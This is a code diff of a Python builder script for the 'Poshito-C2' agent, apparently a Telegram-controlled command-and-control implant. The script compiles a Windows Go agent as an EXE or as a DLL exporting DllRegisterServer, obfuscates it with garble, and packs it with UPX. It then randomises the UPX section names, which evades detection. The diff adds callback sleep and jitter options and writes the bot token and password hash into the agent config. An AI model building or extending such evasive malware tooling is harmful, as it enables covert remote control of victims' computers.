@@ -7,44 +7,6 @@ import argparse
 import subprocess
 
 
-def generate_random_string(length):
-    characters = string.ascii_letters + string.digits + string.punctuation
-    random_string = ''.join(secrets.choice(characters) for _ in range(length))
-    return random_string
-
-
-def calc_md5(input):
-    encoded_string = input.encode('utf-8')
-    md5_hash = hashlib.md5()
-    md5_hash.update(encoded_string)
-    return md5_hash.hexdigest()
-
-
-output_exe = "Poshito.exe"
-output_dll = "Poshito.dll"
-pre_compile = "cd Agent &&"
-compile_exe = f"""
-GOOS=windows GOARCH=amd64 garble build -o ../{output_exe}
-"""
-compile_dll = f"""
-GOOS=windows GOARCH=amd64 CGO_ENABLED=1 garble build -buildmode=c-shared -o ../{output_dll} .
-"""
-upx_cmd = "upx -9 {}"
-upx_sections = {
-    b"UPX0": generate_random_string(4).encode(),
-    b"UPX1": generate_random_string(4).encode(),
-    b"UPX2": generate_random_string(4).encode(),
-    b"UPX!": generate_random_string(4).encode(),
-}
-dll_go_file = """
-package main
-import "C"
-//export {0}
-func {0}() {{
-    main()
-}}
-"""
-
 poshito_help = """
 
 /info       Send information 
@@ -60,6 +22,47 @@ poshito_help = """
 /die        Kill agent
 """
 
+output_exe = "Poshito.exe"
+output_dll = "Poshito.dll"
+pre_compile = "cd Agent &&"
+compile_exe = f"""
+GOOS=windows GOARCH=amd64 garble build -o ../{output_exe}
+"""
+compile_dll = f"""
+GOOS=windows GOARCH=amd64 CGO_ENABLED=1 garble build -buildmode=c-shared -o ../{output_dll} .
+"""
+upx_cmd = "upx -9 {}"
+dll_go_file = """
+package main
+import "C"
+//export {0}
+func {0}() {{
+    main()
+}}
+"""
+
+
+def generate_random_string(length):
+    characters = string.ascii_letters + string.digits + string.punctuation
+    random_string = ''.join(secrets.choice(characters) for _ in range(length))
+    return random_string
+
+
+def calc_md5(input):
+    encoded_string = input.encode('utf-8')
+    md5_hash = hashlib.md5()
+    md5_hash.update(encoded_string)
+    return md5_hash.hexdigest()
+
+
+def write_config_file(name, content):
+    try:
+        with open("Agent/Config/" + name, "wt") as f:
+            f.write(content)
+    except Exception:
+        print("[-] ERROR: Could not write config file:", name)
+        quit(1)
+
 
 def main():
     parser = argparse.ArgumentParser(prog="build", description="Poshito-C2 agent builder")
@@ -74,7 +77,10 @@ def main():
     parser.add_argument("-en", "--export-name", metavar="<name>", 
                         help="dll export name (default: DllRegisterServer)", 
                         default="DllRegisterServer")
-
+    parser.add_argument("-st", "--sleep-time",
+                        help="time to sleep between callback", default="5")
+    parser.add_argument("-sj", "--sleep-jitter", metavar="<percent (%)>", 
+                        help="sleep time jitter in percent", default="0")
     args = parser.parse_args()
     
     # Prepare compilation command line and stuff
@@ -90,28 +96,33 @@ def main():
         compile_cmd = compile_cmd.replace("garble", "go")
 
     # Write configuration files
-    marker = generate_random_string(30)
-    with open("Agent/Config/marker", "wt") as f:
-        f.write(marker)
-    with open("Agent/Config/bot_token", "wt") as f:
-        f.write(args.bot_token)
-    with open("Agent/Config/pass_md5", "wt") as f:
-        f.write(calc_md5(args.password))
+    write_config_file("bot_token", args.bot_token)
+    write_config_file("pass_md5", calc_md5(args.password))
+    write_config_file("marker", generate_random_string(30))
+    write_config_file("sleep_time", args.sleep_time)
+    write_config_file("sleep_time_jitter", args.sleep_jitter)
 
     # Compile
     ret = subprocess.run(compile_cmd, shell=True)
     if ret.returncode != 0:
         print("[-] ERROR: Could not compile")
-        return
+        quit(1)
     else:
         print(f"[+] Compiled successfully")
 
     # Pack UPX
     if not args.no_upx:
+        
+        upx_sections = {
+            b"UPX0": generate_random_string(4).encode(),
+            b"UPX1": generate_random_string(4).encode(),
+            b"UPX2": generate_random_string(4).encode(),
+            b"UPX!": generate_random_string(4).encode(),
+        }
         ret = subprocess.run(upx_cmd.format(output_file), shell=True)
         if ret.returncode != 0:
             print("[-] ERROR: Could not UPX")
-            return
+            quit(1)
         else:
             print(f"[+] UPXed successfully")
         
@@ -127,6 +138,7 @@ def main():
                 print("[+] Obfuscated UPX section names")
             except:
                 print("[-] ERROR: Could not obfuscate UPX section names")
+                quit(1)
 
 
 if __name__ == '__main__':
